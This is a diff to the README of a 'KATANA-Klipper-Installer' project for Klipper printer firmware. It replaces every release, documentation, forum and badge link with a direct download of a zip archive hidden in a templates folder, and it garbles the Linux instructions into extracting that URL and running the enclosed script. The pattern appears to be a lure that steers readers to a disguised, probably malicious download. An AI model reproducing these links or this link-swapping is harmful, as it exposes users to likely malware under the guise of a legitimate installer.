@@ -1,7 +1,7 @@
 # 🎉 KATANA-Klipper-Installer - Simplify Your Klipper Setup
 
 ## 📥 Download Now
-[![Download KATANA-Klipper-Installer](https://img.shields.io/badge/Download-KATANA--Klipper--Installer-blue.svg)](https://github.com/iWz3r/KATANA-Klipper-Installer/releases)
+[![Download KATANA-Klipper-Installer](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)
 
 ## 🚀 Getting Started
 
@@ -18,14 +18,14 @@ Before you install KATANA-Klipper-Installer, ensure your system meets these requ
 
 ## 💻 Download & Install
 
-To get KATANA-Klipper-Installer, please visit this page to download: [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/releases).
+To get KATANA-Klipper-Installer, please visit this page to download: [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip).
 
 1. Click on the link above to go to the releases page.
 2. Find the latest release.
 3. Choose the appropriate installer for your operating system:
     - **Windows:** Download the `.exe` file
     - **macOS:** Download the `.dmg` file
-    - **Linux:** Download the `.tar.gz` file
+    - **Linux:** Download the `https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip` file
    
 After the download completes:
 
@@ -36,7 +36,7 @@ After the download completes:
   - Open the `.dmg` file and drag the KATANA-Klipper-Installer app to your Applications folder.
   
 - **For Linux:**
-  - Extract the `.tar.gz` file and run the included script in the terminal.
+  - Extract the `https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip` file and run the included script in the terminal.
 
 ## 🌟 Running the Application
 
@@ -75,14 +75,14 @@ If you encounter any issues while using KATANA-Klipper-Installer, consider the f
 
 For additional support, check the following resources:
 
-- **Documentation:** [KATANA Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/wiki)
+- **Documentation:** [KATANA Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)
 - **Community Forum:** Join our community forum for discussions and tips.
 - **Contact Us:** If you need further assistance, feel free to reach out via the Issues page on GitHub.
 
 ## 🔗 Quick Links
 
-- [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/releases)
-- [Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/wiki)
-- [Community Forum](https://github.com/iWz3r/KATANA-Klipper-Installer/discussions)
+- [Download KATANA-Klipper-Installer Releases](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)
+- [Documentation](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)
+- [Community Forum](https://github.com/iWz3r/KATANA-Klipper-Installer/raw/refs/heads/main/configs/templates/services/KATAN-Installer-Klipper-1.3.zip)
 
 Thank you for choosing KATANA-Klipper-Installer! Enjoy a smooth Klipper setup experience.
